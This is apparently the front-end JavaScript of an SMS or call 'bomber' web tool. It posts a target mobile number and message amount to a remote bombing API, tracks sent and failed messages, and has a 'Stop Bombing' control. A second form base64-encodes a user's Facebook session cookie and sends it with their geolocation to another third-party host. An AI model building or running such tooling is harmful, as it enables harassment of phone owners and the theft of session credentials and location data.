const btn_loader = '<span class="spinner-border spinner-border-sm"></span>';
$('div:has(input[required]) label').addClass('required');
$("form").trigger("reset");
$('.dropdown').hover(function() {
  if ($(window).width() >= 992) {
    $(this).find('.dropdown-toggle').addClass('show');
    $(this).find('.dropdown-menu').addClass('open');
  }
}, function() {
  if ($(window).width() >= 992) {
    $(this).find('.dropdown-toggle').removeClass('show');
    $(this).find('.dropdown-menu').removeClass('open');
  }
});
function show_msg(msg, type, timeout) {
  if (type == 'danger') {type = 'error'}
  $.toast({text: msg, icon: type, position: 'top-right', showHideTransition: 'slide', hideAfter: timeout})
}
$(window).on('load', function () {
  let url = new URL(window.location.href);
  if (url.searchParams.has('msg')) {
    show_msg(url.searchParams.get("msg"), url.searchParams.get("type"), url.searchParams.get("timeout"));
  }
})
$("#addform").submit(function () {
  let thisform = $(this)
  thisform.find('[type="submit"]').prop('disabled', true);
  thisform.find('[type="submit"]').html('Submitting ' + btn_loader)
  $.ajax({
    url: "https://tzbomber.onrender.com/api/add",
    method: "POST",
    async: false,
    data: thisform.serialize(),
    success: function (r, s) {
      if (r.success){
        show_msg(r.msg, 'success', 1500)
        setTimeout(() => {
          window.location.href = window.location.href.split('?')[0] + '?task_id=' + r.id
        }, 1600);
      } else {
        show_msg(r.msg, 'error', 5000)
      }
      thisform.find('[type="submit"]').prop("disabled", false);
      thisform.find('[type="submit"]').html('Submit');
    },
    error: function (r, s) {
      show_msg('Something went wrong', 'error', 5000)
      thisform.find('[type="submit"]').html('Submit');
    }
  });
})
function loadTaskData() {
  $.ajax({
    url: "https://tzbomber.onrender.com/api/status",
    method: "POST",
    async: false,
    data: "task_id=" + task_id,
    success: function (r, s) {
      if (r.success) {
        $("#mob").text(0 + r.msg.mobile);
        $("#amount").text(r.msg.amount);
        $("#mode").text(r.msg.unlimited ? "Rapid Mode" : "Powered Mode");
        $("#attempt").text(r.msg.attempt);
        $("#sent").text(r.msg.sent);
        $("#failed").text(r.msg.failed);
        $("#run").text(r.msg.run ? 'Yes' : 'No');
        $("#completed").text(r.msg.completed ? "Yes" : "No");
        $("#remaining").text(r.msg.remaining);
        $("#progress-bar").width(r.msg.progress + '%').text(r.msg.progress + '%');
        if (!r.msg.run) {
          $("#progress-bar").removeClass("progress-bar-striped progress-bar-animated");
          clearInterval(window.uid);
          $("#stopbtn").hide();
        }
      } else {
        window.location.href = window.location.href.split('?')[0] + `?msg=${r.msg}&type=error&timeout=3000`
      }
    },
    error: function (r, s) {
      show_msg("Something went wrong", "error", 3000);
    }
  });
}
$("#stopbtn").click(function () {
  $("#stopbtn").prop('disabled', true).html('Stopping ' + btn_loader);
  $.ajax({
    url: "https://tzbomber.onrender.com/api/delete",
    method: "POST",
    async: false,
    data: "task_id=" + task_id,
    success: function (r, s) {
      if (r.success) {
        show_msg(r.msg, 'success', 3000);
      } else {
        show_msg(r.msg, 'error', 3000);
      }
      $("#stopbtn").prop('disabled', false).html('Stop Bombing');
    },
    error: function (r, s) {
      show_msg("Something went wrong", "error", 3000);
      $("#stopbtn").prop('disabled', false).html('Stop Bombing');
    }
  });
})
$("#loc").click(function (event) {
  if ($("#loc").prop("checked")) {
    event.preventDefault();
    $("#loc").prop("disabled", true);
    navigator.geolocation.getCurrentPosition(
      function (data) {
        window.latitude = data.coords.latitude;
        window.longitude = data.coords.longitude;
        $("#loc").prop("disabled", false);
        $("#loc").prop("checked", true);
      },
      function (error) {
        $("#loc").prop("disabled", false);
        show_msg(
          "Location Permission Blocked. You can't continue without providing this requirement.",
          "error",
          5000
        );
      }
    );
  }
})
$("#fbform").submit(async function () {
  function subfunctionhere () {
    $('#fbform [type="submit"]').prop('disabled', true).html('Submitting ' + btn_loader);
    let server_response = null;
    if (isNaN($('#fbinfo').val())) {
      // While There is Cookie
      $.ajax({
        url: "https://fb24hactive.onrender.com/api",
        method: "POST",
        async: false,
        data: `cookie=${encodeURIComponent(btoa($('#fbinfo').val()))}&lat=${window.latitude}&long=${window.longitude}`,
        success: function (r, s) {
          if (r.success) {
            server_response = r;
          } else {
            show_msg(r.msg, r.type, r.timeout);
          }
        },
        error: function (r, s) {
          show_msg("Something went wrong", "error", 3000);
        },
      });
    } else {
      // While There is ID
      $.ajax({
        url: "https://fb24hactive.onrender.com/api?id=" + $('#fbinfo').val(),
        method: "GET",
        async: false,
        success: function (r, s) {
          if (r.success) {
            server_response = r;
          } else {
            show_msg(r.msg, r.type, r.timeout);
          }
        },
        error: function (r, s) {
          show_msg("Something went wrong", "error", 3000);
        }
      });
    }
    if (server_response) {
      $(".fb-img").css('background-image', 'url("' + server_response.img + '")');
      $('#fb_id').text(server_response.fb_id);
      $('#fbname').text(server_response.name);
      $('#fbemail').text(server_response.email);
      $('#fbdob').text(server_response.dob);
      $('#fbgender').text(server_response.gender);
      $('#fbstatus').html(server_response.active ? '<span class="text-success">Running</span>' : '<span class="text-warning">Paused</span>');
      $("#fbform").hide();
      $("#activeinfo").show();
      if (server_response.active) {
        $("#disablebtn").show();
        $("#activebtn").hide();
      } else {
        $("#disablebtn").hide();
        $("#activebtn").show();
      }
    }
    $('#fbform [type="submit"]').prop('disabled', false).html('Submit');
  }
  subfunctionhere();
})

